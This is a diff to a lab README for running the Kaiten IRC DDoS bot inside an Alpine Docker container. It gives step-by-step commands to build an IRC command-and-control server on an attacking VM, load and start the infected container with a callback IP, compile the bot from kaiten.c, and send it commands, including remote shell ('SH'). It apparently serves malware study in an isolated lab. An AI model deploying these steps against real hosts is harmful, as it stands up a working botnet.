@@ -9,7 +9,7 @@ installation. The malware is most often used as a DDoS bot and communicates
 with attackers through IRC.
 
 ## Apline-Kaiten
-In this directory, you will find alpine-kaiten.tar which is a Docker Alpine
+In this directory, you will find **alpine-kaiten.tar**, which is a Docker Alpine
 Linux container that has been infected with the malware. To specify the 
 callback IP, set the KAITEN_SERVER environment variable in the container.
 
@@ -17,22 +17,48 @@ callback IP, set the KAITEN_SERVER environment variable in the container.
 Using the attacking VM, you will need to install an IRC server and client.
 - Install ngircd:
   1. ```git clone https://github.com/ngircd/ngircd.git```
-  1. Install prerequisites: ```apt-get install automake autoconf```
-  1. Run the insall script: ```./autogen.sh```
-  1. Run the usual ```./configure; make; make install```
+  1. Install prerequisites: ```sudo apt-get install -y automake autoconf```
+  1. Run the install script: ```cd ngircd && sudo ./autogen.sh```
+  1. Run the usual ```sudo ./configure; sudo make; sudo make install```
 
 - Install IRC client:
-  1. For example: ```apt-get install hexchat```
+  1. For example: ```sudo apt-get install -y hexchat```
+  2. Set proper server name/address in **ngircd.conf**:
+    ```
+    ;Name = irc.example.net
+	 Name = 192.168.12.34
+    ```
+  3. Start IRC server: `sudo /usr/local/sbin/ngircd -f /home/<user>/ngircd/ngircd.conf -n`
+     - NOTE: `-n` can be omitted to daemonize
+  4. When connecting to the server in the IRC client, set the port to `6667` (Hexchat defaults to `6697` for SSL connections)
 
 ## Victim setup
 Load the docker alpine-kaiten image onto the host. The victim container
 has been infected with the malware and an openrc service has been created
 start the malware on boot.
 
-1. Run: ```sudo docker run -it alpine-kaiten sh --login```
+1. `git clone https://github.com/aaron-hobdy/kaiten`
+2. `cd kaiten`
+3. `sudo apt-get install -y unzip`
+4. `unzip kaiten_docker_image.zip`
+5. `sudo docker load < kaiten_docker_image/alpine-kaiten.tar`
+6. `sudo docker run -it alpine-kaiten sh --login`
    - NOTE: The --login uses the /etc/profile to set the KAITEN_SERVER
      environment variable when logging in interactively. You could also
      set it in a docker-compose file.
+7. Alternatively, it can be set manually and restarted:
+    ```
+    export KAITEN_SERVER="192.168.12.34"
+    cd /root
+    ./kaiten
+    ps aux | grep kaiten
+    ```
+
+If desired, the **kaiten** binary can be compiled from source (need to install the `libc-dev` package):
+```
+apk add libc-dev
+gcc -o kaiten -lm kaiten.c
+```
 
 ## Command and Control
 1. Use the IRC client installed on the attacking machine to connect to 
@@ -65,5 +91,5 @@ There are a number of commands that can be sent to a client:
 ```
 
 ### Example Command
-Screenshot from the working PoC
+Screenshot from the working PoC (note that `SH` needs to be capitalized)
 - ![image info](./example.png)
